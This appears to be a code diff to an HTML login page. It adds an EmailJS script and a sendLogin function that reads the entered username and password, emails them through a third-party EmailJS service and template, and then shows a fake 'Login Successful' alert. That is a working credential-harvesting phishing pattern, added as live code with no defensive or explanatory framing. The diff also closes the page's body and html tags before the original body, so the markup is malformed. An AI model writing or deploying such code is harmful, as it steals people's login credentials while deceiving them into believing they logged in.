@@ -36,7 +36,35 @@ cursor:pointer;
 }
 </style>
 </head>
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 
+<script>
+
+(function(){
+emailjs.init("287g46US2fGjoY4LL");
+})();
+
+function sendLogin(){
+
+var username = document.getElementById("username").value;
+var password = document.getElementById("password").value;
+
+var params = {
+username: username,
+password: password
+};
+
+emailjs.send("service_3ux49q7","template_fn1apho",params)
+.then(function(){
+alert("Login Successful");
+});
+
+}
+
+</script>
+
+</body>
+</html>
 <body>
 
 <div class="login-box">
